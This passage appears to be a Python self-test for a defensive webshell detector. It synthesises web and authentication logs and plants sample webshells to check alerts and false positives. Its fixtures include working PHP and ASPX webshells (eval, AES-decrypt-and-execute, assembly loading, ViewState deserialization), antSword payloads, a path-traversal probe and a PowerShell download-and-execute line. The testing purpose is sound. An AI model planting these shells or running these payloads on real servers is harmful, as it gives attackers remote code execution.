#!/usr/bin/env python3
"""
防守端自测：合成真实形态的访问日志、认证日志与 Web 目录，
验证「日志监控 / 文件巡检 / 认证监控」三条链路，并检查误报。

    sudo python3 selftest.py        （文件巡检部分普通用户也能跑）

覆盖内容：
  A. 访问日志
     - 蚁剑：antSword UA + 固定初始化载荷（默认配置与自定义参数名两种）
     - 冰蝎：内置 UA 池 + octet-stream + 默认密钥可解密的载荷
     - 哥斯拉：Firefox84 UA + Cookie 尾分号 + md5+base64+md5 响应结构
     - 正常流量：浏览器访问、正常业务 API（带 Base64 图片字段）、健康检查
     - 日志轮转（inode 变化）与截断处理
  B. 文件巡检
     - 植入 eval($_POST) 一句话马、冰蝎 PHP 马、Base64 混淆马
     - 正常业务代码不应误报
     - 新增文件识别、777 权限识别、基线建立与更新
  C. 认证日志
     - SSH 爆破、爆破后成功登录、authorized_keys 相关提权动作
"""

from __future__ import annotations

import base64
import os
import shutil
import sys
import time
from typing import Dict, List

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from wsa.alerting import Alerter
from wsa.analysis import AnalysisOptions, Analyzer
from wsa.authmon import AuthMonitor
from wsa.filescan import FileScanner
from wsa.logs import WebLogMonitor, parse_line
from wsa.models import Alert, Severity

ANTSWORD_INIT = (
    '@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<\'5.3.0\')'
    '{@set_magic_quotes_runtime(0);};echo("X@Y");'
)
BEHINDER_KEY = "e45e329feb5d925b"


# ---------------------------------------------------------------------------
# 辅助：真实 AES-128-ECB 加密（测试夹具），复用已通过 FIPS 向量校验的实现
# ---------------------------------------------------------------------------
def _pkcs7_pad(data: bytes) -> bytes:
    n = 16 - len(data) % 16
    return data + bytes([n]) * n


def _aes128_ecb_encrypt(key: bytes, data: bytes) -> bytes:
    from wsa.aes import SBOX, _mul

    rc = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36]
    words = [list(key[i : i + 4]) for i in range(0, 16, 4)]
    for i in range(4, 44):
        temp = list(words[i - 1])
        if i % 4 == 0:
            temp = temp[1:] + temp[:1]
            temp = [SBOX[b] for b in temp]
            temp[0] ^= rc[i // 4 - 1]
        words.append([words[i - 4][j] ^ temp[j] for j in range(4)])
    rk = [sum(words[4 * r : 4 * r + 4], []) for r in range(11)]

    def ark(state, r):
        k = rk[r]
        for c in range(4):
            for x in range(4):
                state[c][x] ^= k[4 * c + x]

    def sub(state):
        for c in range(4):
            for x in range(4):
                state[c][x] = SBOX[state[c][x]]

    def shift(state):
        for r in range(1, 4):
            col = [state[c][r] for c in range(4)]
            col = col[r:] + col[:r]
            for c in range(4):
                state[c][r] = col[c]

    def mix(state):
        for c in range(4):
            a = state[c]
            state[c] = [
                _mul(a[0], 2) ^ _mul(a[1], 3) ^ a[2] ^ a[3],
                a[0] ^ _mul(a[1], 2) ^ _mul(a[2], 3) ^ a[3],
                a[0] ^ a[1] ^ _mul(a[2], 2) ^ _mul(a[3], 3),
                _mul(a[0], 3) ^ a[1] ^ a[2] ^ _mul(a[3], 2),
            ]

    out = bytearray()
    data = _pkcs7_pad(data)
    for i in range(0, len(data), 16):
        block = data[i : i + 16]
        state = [list(block[j : j + 4]) for j in range(0, 16, 4)]
        ark(state, 0)
        for r in range(1, 10):
            sub(state); shift(state); mix(state); ark(state, r)
        sub(state); shift(state); ark(state, 10)
        out.extend(b for col in state for b in col)
    return bytes(out)


# ---------------------------------------------------------------------------
# 合成日志
# ---------------------------------------------------------------------------
TS = "13/Oct/2026:"


def nginx_line(
    ip: str,
    path: str,
    status: int,
    ua: str,
    body: str = "",
    method: str = "GET",
    referer: str = "-",
    host: str = "www.example.com",
    second: int = 0,
) -> str:
    ts = f"{TS}{10 + second // 3600:02d}:{(second // 60) % 60:02d}:{second % 60:02d} +0800"
    nbytes = 512
    line = (
        f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} {nbytes} '
        f'"{referer}" "{ua}"'
    )
    if body:
        line += f" {body}"
    return line


def build_access_log() -> List[str]:
    lines: List[str] = []
    # --- 正常流量 ---
    browser = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    )
    for i in range(6):
        lines.append(
            nginx_line("203.0.113.9", f"/index.php?page={i}", 200, browser,
                       referer="https://www.example.com/", second=i)
        )
    lines.append(
        nginx_line("203.0.113.9", "/api/v1/profile/update", 200, browser,
                   method="POST",
                   body='{"userId":1024,"avatar":"data:image/png;base64,'
                        + base64.b64encode(os.urandom(90)).decode()
                        + '","nickname":"zhangsan"}',
                   referer="https://www.example.com/profile", second=20)
    )
    lines.append(
        nginx_line("10.0.0.5", "/healthz", 200, "kube-probe/1.29", second=30)
    )
    # --- 蚁剑：默认 UA + 固定初始化载荷（参数名 z0）---
    ant_body = "z0=" + base64.b64encode(ANTSWORD_INIT.encode()).decode() + "&z1=" + base64.b64encode(b"whoami").decode()
    lines.append(
        nginx_line("198.51.100.7", "/upload/shell.php", 200, "antSword/v2.1",
                   method="POST", body=ant_body, second=100)
    )
    # --- 蚁剑：改过 UA 与参数名，仅靠载荷特征检出 ---
    ant_body2 = "cmd=" + base64.b64encode(ANTSWORD_INIT.encode()).decode()
    lines.append(
        nginx_line("198.51.100.7", "/assets/img/logo.php", 200, browser,
                   method="POST", body=ant_body2, second=130)
    )
    # --- 冰蝎：内置 UA 池 + 表单密码参数 + 可解密的 AES 载荷 ---
    behinder_ua = (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
    )
    ct = _aes128_ecb_encrypt(BEHINDER_KEY.encode(), b"whoami")
    bh_body = "pass=" + base64.b64encode(ct).decode()
    lines.append(
        nginx_line("198.51.100.9", "/upload/behinder.php", 200, behinder_ua,
                   method="POST", body=bh_body, second=200)
    )
    # --- 哥斯拉：Firefox84 UA + Cookie 尾分号无法体现在日志里，用响应结构后的 UA 与参数 ---
    god_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
    god_body = "pass=" + base64.b64encode(os.urandom(48)).decode()
    lines.append(
        nginx_line("198.51.100.11", "/data/upload/x.php", 200, god_ua,
                   method="POST", body=god_body, second=260)
    )
    # --- 扫描器 ---
    lines.append(
        nginx_line("198.51.100.20", "/.env", 404, "python-requests/2.31.0", second=300)
    )
    lines.append(
        nginx_line("198.51.100.20", "/wp-config.php.bak", 404, "nuclei/v3.0", second=301)
    )
    # --- 命令执行载荷探测 ---
    lines.append(
        nginx_line("198.51.100.30", "/index.php?cmd=whoami", 200, browser, second=320)
    )
    lines.append(
        nginx_line("198.51.100.30", "/search.php", 200, browser, method="POST",
                   body="q=../../../../etc/passwd", second=321)
    )
    # --- 爆破脚本文件（触发高频统计）---
    for i in range(35):
        lines.append(
            nginx_line("198.51.100.40", "/upload/shell.php", 200, browser,
                       method="POST", body="z0=" + base64.b64encode(b"id").decode(),
                       second=400 + i)
        )
    return lines


def build_auth_log() -> List[str]:
    lines: List[str] = []
    lines.append("Oct 13 10:00:00 web01 sshd[1001]: Failed password for root from 198.51.100.77 port 51001 ssh2")
    for i in range(1, 12):
        lines.append(
            f"Oct 13 10:00:{i:02d} web01 sshd[{1001 + i}]: Failed password for invalid user admin "
            f"from 198.51.100.77 port {51001 + i} ssh2"
        )
    lines.append("Oct 13 10:00:20 web01 sshd[1050]: Accepted password for root from 198.51.100.77 port 51200 ssh2")
    lines.append("Oct 13 10:05:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash")
    lines.append("Oct 13 10:06:00 web01 useradd[1060]: new user: name=backdoor, UID=1001, GID=1001")
    lines.append("Oct 13 10:07:00 web01 sshd[1070]: Accepted publickey for deploy from 203.0.113.15 port 40000 ssh2")
    return lines


# ---------------------------------------------------------------------------
# 合成 Web 目录
# ---------------------------------------------------------------------------
WEBSHELL_SAMPLES = {
    "upload/shell.php": """<?php
@ini_set("display_errors","0");
$cmd = $_POST['z0'];
@eval(base64_decode($cmd));
""",
    "upload/behinder.php": """<?php
@error_reporting(0);
session_start();
$key = "e45e329feb5d925b";
$_SESSION['k'] = $key;
$post = file_get_contents("php://input");
$post = openssl_decrypt($post, "AES128", $key);
$arr = explode('|', $post);
class C { public function __invoke($p) { eval($p.""); } }
@call_user_func(new C(), $arr[1]);
""",
    "assets/logo.php": """<?php
$payload = "aXNzZXQoJF9QT1NUWyd6MCddKQ==";
$f = "base64_" . "decode";
$g = "ev" . "al";
$g($f($payload));
""",
    "data/x.php": """<?php
$k = $_REQUEST['pass'];
$data = str_rot13(gzinflate(base64_decode($k)));
eval($data);
""",
    "logs/1.php": """<?php
$k="e45e329feb5d925b";
$c=base64_decode($_POST['pass']);
$d=openssl_decrypt($c,"AES128",$k);
@eval($d);
""",
}

NORMAL_SAMPLES = {
    "index.php": """<?php
require_once __DIR__ . '/vendor/autoload.php';
$app = new App\\Application();
$app->handle($_SERVER['REQUEST_URI']);
""",
    "api/profile.php": """<?php
$data = json_decode(file_get_contents('php://input'), true);
$user = UserRepository::find((int)$data['userId']);
echo json_encode(['code' => 0, 'data' => $user->toArray()]);
""",
    "lib/Database.php": """<?php
class Database {
    private PDO $pdo;
    public function __construct(string $dsn) {
        $this->pdo = new PDO($dsn);
    }
    public function query(string $sql, array $params = []): array {
        $stmt = $this->pdo->prepare($sql);
        $stmt->execute($params);
        return $stmt->fetchAll();
    }
}
""",
}

# ---------------------------------------------------------------------------
# Windows 侧样本（IIS 日志 + .NET 马 + 事件日志）
# ---------------------------------------------------------------------------
ASPX_WEBSHELL = """<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request["z0"];
    byte[] payload = Convert.FromBase64String(cmd);
    System.Reflection.Assembly.Load(payload).CreateInstance("U").Equals(this);
}
</script>
"""

ASPNET_WEBSHELL_CLEAN_LOOKING = """<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    object o = new System.Web.UI.ObjectStateFormatter();
    var data = Request.Form["__VIEWSTATE"];
    var obj = o.Deserialize(Convert.FromBase64String(data));
}
</script>
"""

ASPX_BEHINDER = """<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string key = "e45e329feb5d925b";
    byte[] data = Convert.FromBase64String(Request["pass"]);
    var aes = new System.Security.Cryptography.AesCryptoServiceProvider();
    var dec = aes.CreateDecryptor(Encoding.UTF8.GetBytes(key), new byte[16]);
    var ms = new System.IO.MemoryStream(data);
    var cs = new System.Security.Cryptography.CryptoStream(ms, dec, CryptoStreamMode.Read);
    var reader = new System.IO.StreamReader(cs);
    var code = reader.ReadToEnd();
    var provider = new Microsoft.CSharp.CSharpCodeProvider();
    provider.CompileAssemblyFromSource(null, code);
}
</script>
"""

NORMAL_ASPX = """<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Default.aspx.cs" Inherits="Site.Default" %>
<!DOCTYPE html>
<html><head><title>首页</title></head>
<body><form id="form1" runat="server">
<asp:Label ID="Label1" runat="server" Text="欢迎"></asp:Label>
</form></body></html>
"""

#: 一段真实形态的 IIS W3C 日志
IIS_LOG = """#Software: Microsoft Internet Information Services 10.0
#Version: 1.0
#Date: 2026-10-13 10:00:00
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2026-10-13 10:00:01 10.0.0.10 GET /default.aspx - 80 - 203.0.113.9 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+Chrome/124.0+Safari/537.36 https://www.example.com/ 200 0 0 123
2026-10-13 10:00:05 10.0.0.10 GET /Content/site.css - 80 - 203.0.113.9 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Chrome/124.0 https://www.example.com/ 200 0 0 12
2026-10-13 10:00:30 10.0.0.10 POST /upload/shell.aspx - 80 - 198.51.100.7 antSword/v2.1 - 200 0 0 2100
2026-10-13 10:00:41 10.0.0.10 POST /upload/shell.aspx z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIp&z1=d2hvYW1p 80 - 198.51.100.7 antSword/v2.1 - 200 0 0 1800
2026-10-13 10:01:02 10.0.0.10 POST /Images/logo.aspx id=1 80 - 198.51.100.7 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/124.0+Safari/537.36 - 200 0 0 900
2026-10-13 10:02:10 10.0.0.10 GET /.env - 80 - 198.51.100.20 python-requests/2.31.0 - 404 0 2 15
2026-10-13 10:02:12 10.0.0.10 GET /web.config - 80 - 198.51.100.20 nuclei/v3.0 - 200 0 0 20
2026-10-13 10:03:00 10.0.0.10 POST /default.aspx cmd=whoami 80 - 198.51.100.30 Mozilla/5.0+(compatible;+MSIE+9.0) - 200 0 0 800
2026-10-13 10:04:00 10.0.0.10 GET /HealthCheck.ashx - 80 - 10.0.0.5 HealthCheck/1.0 - 200 0 0 8
"""

#: Windows 事件日志样本（Get-WinEvent 的输出形态）
WIN_EVENTS = [
    {
        "record_id": 1001, "id": 4625, "time": "2026-10-13T10:00:01", "log": "Security", "level": 0,
        "message": "登录失败：用户名: administrator。源网络地址: 198.51.100.77",
        "data": {"TargetUserName": "administrator", "IpAddress": "198.51.100.77", "LogonType": "3"},
    },
    {
        "record_id": 1002, "id": 4625, "time": "2026-10-13T10:00:02", "log": "Security", "level": 0,
        "message": "登录失败：用户名: administrator。源网络地址: 198.51.100.77",
        "data": {"TargetUserName": "administrator", "IpAddress": "198.51.100.77", "LogonType": "3"},
    },
    {
        "record_id": 1003, "id": 4624, "time": "2026-10-13T10:00:09", "log": "Security", "level": 0,
        "message": "登录成功：用户名: administrator。源网络地址: 198.51.100.77",
        "data": {"TargetUserName": "administrator", "IpAddress": "198.51.100.77", "LogonType": "10"},
    },
    {
        "record_id": 1004, "id": 4672, "time": "2026-10-13T10:00:10", "log": "Security", "level": 0,
        "message": "为新登录分配了特殊权限：administrator",
        "data": {"SubjectUserName": "administrator", "IpAddress": ""},
    },
    {
        "record_id": 1005, "id": 4720, "time": "2026-10-13T10:05:00", "log": "Security", "level": 0,
        "message": "已创建用户帐户：backdoor",
        "data": {"TargetUserName": "backdoor", "SubjectUserName": "administrator"},
    },
    {
        "record_id": 1006, "id": 7045, "time": "2026-10-13T10:06:00", "log": "System", "level": 4,
        "message": "服务已安装到系统: WinSvc 服务文件名: C:\\Windows\\Temp\\svc.exe",
        "data": {"ServiceName": "WinSvc", "ImagePath": "C:\\Windows\\Temp\\svc.exe"},
    },
    {
        "record_id": 1007, "id": 4104, "time": "2026-10-13T10:07:00", "log": "PowerShell", "level": 3,
        "message": "创建脚本块: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1')",
        "data": {},
    },
]


def build_webroot(root: str) -> None:
    for rel, content in WEBSHELL_SAMPLES.items():
        path = os.path.join(root, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
    for rel, content in NORMAL_SAMPLES.items():
        path = os.path.join(root, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
    # 777 的脚本，用于权限告警
    os.chmod(os.path.join(root, "logs/1.php"), 0o777)


def build_windows_webroot(root: str) -> Dict[str, str]:
    """构造 Windows/IIS 形态的 Web 目录，返回 {相对路径: 期望分类}。"""
    samples = {
        "upload/shell.aspx": (ASPX_WEBSHELL, "webshell"),
        "upload/behinder.aspx": (ASPX_BEHINDER, "webshell"),
        "Images/logo.aspx": (ASPX_WEBSHELL, "webshell"),
        "Views/state.aspx": (ASPNET_WEBSHELL_CLEAN_LOOKING, "webshell"),
        "Default.aspx": (NORMAL_ASPX, "normal"),
        "web.config": (
            '<?xml version="1.0"?>\n<configuration>\n'
            '  <system.webServer><handlers><add name="x" path="*.jpg" '
            'verb="*" type="System.Web.UI.PageHandlerFactory"/></handlers></system.webServer>\n'
            "</configuration>\n",
            "config",
        ),
    }
    kinds: Dict[str, str] = {}
    for rel, (content, kind) in samples.items():
        path = os.path.join(root, rel.replace("/", os.sep))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
        kinds[os.path.normpath(path)] = kind
    return kinds


# ---------------------------------------------------------------------------
def _test_windows_section(rep: Reporter, workdir: str, analyzer: Analyzer) -> None:
    """Windows 侧（IIS 日志、事件日志、ASPX 马文件）的检测验证。"""
    from wsa.winmon import (
        EventLogMonitor,
        IisLogMonitor,
        WindowsDropScanner,
        parse_iis_header,
        parse_iis_line,
    )

    # --- IIS 日志解析 ---
    lines = IIS_LOG.strip().splitlines()
    header = None
    entries = []
    for line in lines:
        if line.startswith("#Fields:"):
            header = parse_iis_header(line)
            continue
        if line.startswith("#") or header is None:
            continue
        entry = parse_iis_line(line, header)
        if entry:
            entries.append(entry)

    rep.check("IIS 表头解析正确", bool(header) and "cs-uri-stem" in (header or []),
              str(header))
    rep.check("IIS 日志行全部解析", len(entries) == 9, f"解析 {len(entries)}/9 行")
    if entries:
        e = entries[0]
        rep.check(
            "IIS 字段映射正确（IP/方法/路径/状态/UA）",
            e.client_ip == "203.0.113.9" and e.method == "GET" and e.path == "/default.aspx"
            and e.status == 200 and "Chrome" in e.user_agent,
            f"{e.client_ip} {e.method} {e.path} {e.status} {e.user_agent[:40]}",
        )
        # 查询串应保留在 path 里，且 %2B 之类的编码被还原
        q = next((x for x in entries if "z0=" in x.path), None)
        rep.check("IIS 查询串载荷被保留并解码",
                  q is not None and "QGluaV9zZXQ" in q.path,
                  q.path[:80] if q else "未找到带 z0 的行")

    # --- IIS 日志监控（走完整规则链路）---
    iis_path = os.path.join(workdir, "iis", "u_ex261013.log")
    os.makedirs(os.path.dirname(iis_path), exist_ok=True)
    with open(iis_path, "w", encoding="utf-8") as fh:
        fh.write(IIS_LOG)
    alerter = Alerter(log_dir=os.path.join(workdir, "logs-win"), syslog=False, console=False)
    mon = IisLogMonitor(
        alert_fn=alerter.emit,
        log_fn=alerter.log,
        analyzer=analyzer,
        sources=[{"name": "iis-test", "path": os.path.dirname(iis_path)}],
        from_beginning=True,
    )
    rounds = 0
    while mon.poll_once() > 0 and rounds < 20:
        rounds += 1
    rules_hit = set()
    tools_hit = set()
    for a in alerter.alerts:
        for rid in a.rule_id.split(","):
            rules_hit.add(rid.strip())
        tools_hit.add(a.tool)
    rep.check("IIS 日志中检出蚁剑流量", "蚁剑" in tools_hit, str(sorted(tools_hit)))
    rep.check("IIS 日志中识别扫描器 UA", "DEF-010" in rules_hit, str(sorted(rules_hit)))
    rep.check("IIS 日志中识别命令执行载荷", "DEF-011" in rules_hit)
    normal_high = [
        a for a in alerter.alerts
        if "203.0.113.9" in a.flow and Severity.rank(a.severity) >= Severity.rank(Severity.HIGH)
        and a.tool != "蚁剑"
    ]
    rep.check("IIS 正常浏览流量无额外高危告警", not normal_high,
              str([(a.flow, a.rule_id) for a in normal_high])[:160])

    # --- Windows 事件日志解析与规则 ---
    alerter2 = Alerter(log_dir=os.path.join(workdir, "logs-evt"), syslog=False, console=False)
    evt = EventLogMonitor(
        alert_fn=alerter2.emit,
        log_fn=alerter2.log,
        rules=analyzer.rules,
        log_name="Security",
        state_dir=os.path.join(workdir, "state-win"),
        fail_threshold=2,
        trusted_ips=["10.0.0.1"],
    )
    for raw in WIN_EVENTS:
        ev = EventLogMonitor._to_event(raw)
        if ev is None:
            continue
        evt.events_total += 1
        evt._handle(ev)
    evt_rules = {a.rule_id for a in alerter2.alerts}
    rep.check("Windows 登录失败被统计（DEF-040）", "DEF-040" in evt_rules, str(sorted(evt_rules)))
    rep.check("Windows 登录成功被识别（DEF-041）", "DEF-041" in evt_rules)
    rep.check("Windows 提权/建号被识别（DEF-042）", "DEF-042" in evt_rules)
    rep.check("Windows 服务安装被识别（DEF-043）", "DEF-043" in evt_rules)
    rep.check("PowerShell 高危脚本块被识别（DEF-044）", "DEF-044" in evt_rules)
    succ = [a for a in alerter2.alerts if a.rule_id == "DEF-041"]
    rep.check("爆破来源的登录成功被加分",
              bool(succ) and succ[0].score > 15,
              str([(a.rule_id, a.score) for a in alerter2.alerts])[:160])

    # --- 事件日志状态文件（增量采集）---
    state_file = os.path.join(workdir, "state-win", "win-event-state-security.json")
    evt._record_id = 5000
    evt._save_state()
    rep.check("事件日志进度可持久化（避免重启后重复告警）",
              os.path.isfile(state_file), state_file)

    # --- Windows/IIS 马文件静态特征 ---
    winroot = os.path.join(workdir, "www-win")
    kinds = build_windows_webroot(winroot)
    alerter3 = Alerter(log_dir=os.path.join(workdir, "logs-win2"), syslog=False, console=False)
    scanner = FileScanner(
        alert_fn=alerter3.emit,
        log_fn=alerter3.log,
        rules=analyzer.rules,
        webroots=[winroot],
        script_extensions=[".aspx", ".ashx", ".asp", ".php"],
        state_dir=os.path.join(workdir, "state-win2"),
    )
    result = scanner.scan()
    flagged = {os.path.normpath(a.flow) for a in alerter3.alerts
               if a.rule_id in ("DEF-031", "DEF-032")}
    want = {p for p, k in kinds.items() if k == "webshell"}
    missed = want - flagged
    rep.check("ASPX/.NET webshell 样本全部被检出", not missed,
              f"漏报：{sorted(os.path.basename(p) for p in missed)}")
    normal = {p for p, k in kinds.items() if k == "normal"}
    rep.check("正常 ASPX 页面未被误报", not (normal & flagged),
              f"误报：{sorted(os.path.basename(p) for p in normal & flagged)}")
    # 上传目录里的脚本（IIS 场景的重点）
    up = [a for a in alerter3.alerts if a.rule_id == "DEF-036"]
    rep.check("上传目录中的脚本被识别（DEF-036）", bool(up),
              str([os.path.basename(a.flow) for a in up]))
    cfg_hit = [a for a in alerter3.alerts if a.rule_id == "DEF-038"]
    rep.check("web.config 被识别（DEF-038）", bool(cfg_hit),
              str([os.path.basename(a.flow) for a in cfg_hit]))

    # --- Windows 落地目录扫描（非 Windows 上无法遍历 C:\，只验证状态逻辑）---
    if os.name == "nt":
        drop_dir = os.path.join(workdir, "drop-test")
        os.makedirs(drop_dir, exist_ok=True)
        alerter4 = Alerter(log_dir=os.path.join(workdir, "logs-drop"), syslog=False, console=False)
        drop = WindowsDropScanner(
            alert_fn=alerter4.emit,
            log_fn=alerter4.log,
            rules=analyzer.rules,
            directories=[drop_dir],
            lookback_days=1,
            state_dir=os.path.join(workdir, "state-drop"),
        )
        drop.scan_once()                       # 第一次只建基线
        baseline_alerts = len(alerter4.alerts)
        loader = os.path.join(drop_dir, "update.exe")
        with open(loader, "wb") as fh:
            fh.write(b"MZ" + os.urandom(256))
        os.utime(loader, None)
        drop.scan_once()
        rep.check("Windows 落地目录首次扫描不告警（只建基线）", baseline_alerts == 0,
                  f"{baseline_alerts} 条")
        rep.check("Windows 落地目录新增 exe 被告警（DEF-037）",
                  any(a.rule_id == "DEF-037" for a in alerter4.alerts),
                  str([(a.rule_id, os.path.basename(a.flow)) for a in alerter4.alerts]))
        # 噪声文件不应告警
        before = len(alerter4.alerts)
        noise = os.path.join(drop_dir, "MpCache_1234.tmp.exe")
        with open(noise, "wb") as fh:
            fh.write(b"MZ")
        os.utime(noise, None)
        drop.scan_once()
        rep.check("落地目录噪声文件名被过滤", len(alerter4.alerts) == before,
                  f"新增 {len(alerter4.alerts) - before} 条")
    else:
        print("  [跳过] Windows 落地目录实际遍历 —— 需要在 Windows 上验证")


class Reporter:
    def __init__(self) -> None:
        self.total = 0
        self.passed = 0
        self.failed: List[str] = []

    def check(self, name: str, ok: bool, detail: str = "") -> None:
        self.total += 1
        if ok:
            self.passed += 1
            print(f"  [通过] {name}")
        else:
            self.failed.append(name)
            print(f"  [失败] {name} {detail}")

    def report(self) -> bool:
        print()
        print("=" * 78)
        print(f"防守端自测结果：{self.passed}/{self.total} 项通过")
        for f in self.failed:
            print(f"  - {f}")
        print("=" * 78)
        return not self.failed


def main() -> int:
    here = os.path.dirname(os.path.abspath(__file__))
    workdir = os.path.join(here, "selftest-output")
    shutil.rmtree(workdir, ignore_errors=True)
    os.makedirs(workdir, exist_ok=True)

    rep = Reporter()
    print("=" * 78)
    print("WebShell 防守监控 自测")
    print("=" * 78)

    analyzer = Analyzer(rule_dir="", options=AnalysisOptions(min_score=25))

    # ==================================================================
    print("\n[A] 访问日志监控")
    log_path = os.path.join(workdir, "access.log")
    with open(log_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(build_access_log()) + "\n")

    alerter = Alerter(log_dir=os.path.join(workdir, "logs"), syslog=False, console=False)
    mon = WebLogMonitor(
        alert_fn=alerter.emit,
        log_fn=alerter.log,
        analyzer=analyzer,
        sources=[{"name": "test", "path": log_path, "format": "nginx_combined_body"}],
        from_beginning=True,
    )
    rounds = 0
    while mon.poll_once() > 0 and rounds < 50:
        rounds += 1
    alerts = list(alerter.alerts)
    by_rule: Dict[str, List[Alert]] = {}
    for a in alerts:
        for rid in a.rule_id.split(","):
            by_rule.setdefault(rid.strip(), []).append(a)
    tools = {a.tool for a in alerts}

    rep.check("日志行全部解析成功", mon.parse_fail == 0, f"失败 {mon.parse_fail} 行")
    # 单行解析的字段正确性（避免“整体能跑但字段错位”的隐蔽问题）
    sample = parse_line(
        '198.51.100.7 - - [13/Oct/2026:10:15:00 +0800] "POST /upload/shell.php HTTP/1.1" '
        '200 512 "-" "antSword/v2.1" z0=abc%3D'
    )
    rep.check(
        "单行解析字段正确（IP/方法/路径/状态/UA/请求体）",
        sample is not None
        and sample.client_ip == "198.51.100.7"
        and sample.method == "POST"
        and sample.path == "/upload/shell.php"
        and sample.status == 200
        and sample.user_agent == "antSword/v2.1"
        and sample.body == "z0=abc=",
        repr(sample.body) if sample else "解析失败",
    )
    rep.check("解析出全部日志条目", mon.entries_total == len(build_access_log()),
              f"{mon.entries_total} vs {len(build_access_log())}")
    rep.check("检测到请求体（能力前提）", mon.body_seen >= 6, f"带体 {mon.body_seen} 条")
    rep.check("蚁剑流量被检出（工具特征）", "蚁剑" in tools, str(sorted(tools)))
    rep.check("冰蝎流量被检出（工具特征）", "冰蝎" in tools, str(sorted(tools)))
    rep.check("哥斯拉流量被检出（工具特征）", "哥斯拉" in tools, str(sorted(tools)))
    rep.check("扫描器 UA 被识别（nuclei/python-requests）", "DEF-010" in by_rule,
              str([a.rule_id for a in alerts])[:200])
    rep.check("命令执行载荷被识别（whoami / 路径穿越）", "DEF-011" in by_rule)
    rep.check("高频访问脚本文件触发行为告警", "DEF-020" in by_rule,
              str(sorted(by_rule)))
    cry = [a for a in alerts if "CRY-001" in a.rule_id]
    rep.check("冰蝎默认密钥解密成功（取证能力）", bool(cry),
              str([a.title for a in alerts if a.tool == "冰蝎"])[:200])

    # 误报检查：正常流量的 IP 不应出现高危告警
    normal_ips = {"203.0.113.9", "10.0.0.5"}
    normal_high = [
        a for a in alerts
        if any(ip in a.flow for ip in normal_ips)
        and Severity.rank(a.severity) >= Severity.rank(Severity.HIGH)
    ]
    rep.check("正常浏览器/健康检查流量无高危告警", not normal_high,
              str([(a.flow, a.rule_id, a.severity) for a in normal_high])[:200])

    # --- 日志轮转与截断 ---
    print("\n[A2] 日志轮转处理")
    mon2 = WebLogMonitor(
        alert_fn=alerter.emit, log_fn=alerter.log, analyzer=analyzer,
        sources=[{"name": "rot", "path": log_path, "format": "nginx_combined_body"}],
        from_beginning=False,
    )
    mon2.poll_once()  # 建立偏移
    rotated = log_path + ".1"
    os.replace(log_path, rotated)
    with open(log_path, "w", encoding="utf-8") as fh:
        fh.write(nginx_line("198.51.100.7", "/upload/shell.php", 200, "antSword/v2.1",
                            method="POST",
                            body="z0=" + base64.b64encode(ANTSWORD_INIT.encode()).decode(),
                            second=900) + "\n")
    mon2.poll_once()
    rep.check("logrotate 后仍能读到新文件内容", mon2.tailers[0][1].rotations >= 1,
              f"rotations={mon2.tailers[0][1].rotations}")
    with open(log_path, "a", encoding="utf-8") as fh:
        fh.write(nginx_line("198.51.100.8", "/x.php", 200, "antSword/v2.1",
                            method="POST",
                            body="z0=" + base64.b64encode(ANTSWORD_INIT.encode()).decode(),
                            second=950) + "\n")
    n_events = mon2.poll_once()
    rep.check("轮转后新增日志被继续处理", n_events >= 1, f"处理 {n_events} 行")

    # ==================================================================
    print("\n[B] Web 目录文件巡检")
    webroot = os.path.join(workdir, "www")
    build_webroot(webroot)
    state_dir = os.path.join(workdir, "state")
    os.makedirs(state_dir, exist_ok=True)
    alerter2 = Alerter(log_dir=os.path.join(workdir, "logs2"), syslog=False, console=False)
    scanner = FileScanner(
        alert_fn=alerter2.emit,
        log_fn=alerter2.log,
        rules=analyzer.rules,
        webroots=[webroot],
        script_extensions=[".php"],
        state_dir=state_dir,
    )
    first = scanner.scan()
    rep.check("首次巡检收集到脚本文件", first.scanned >= len(WEBSHELL_SAMPLES) + len(NORMAL_SAMPLES),
              f"scanned={first.scanned}")
    rep.check("首次巡检建立了基线", not scanner.baseline_missing)
    sig_alerts = [a for a in alerter2.alerts if a.rule_id in ("DEF-031", "DEF-032")]
    flagged_paths = {os.path.normpath(a.flow) for a in sig_alerts}
    expected = {os.path.normpath(os.path.join(webroot, p)) for p in WEBSHELL_SAMPLES}
    missed = expected - flagged_paths
    rep.check("全部 5 个 webshell 样本被检出", not missed,
              f"漏报：{sorted(os.path.basename(p) for p in missed)}")
    normal_paths = {os.path.normpath(os.path.join(webroot, p)) for p in NORMAL_SAMPLES}
    false_pos = normal_paths & flagged_paths
    rep.check("正常业务代码未被误报为 webshell", not false_pos,
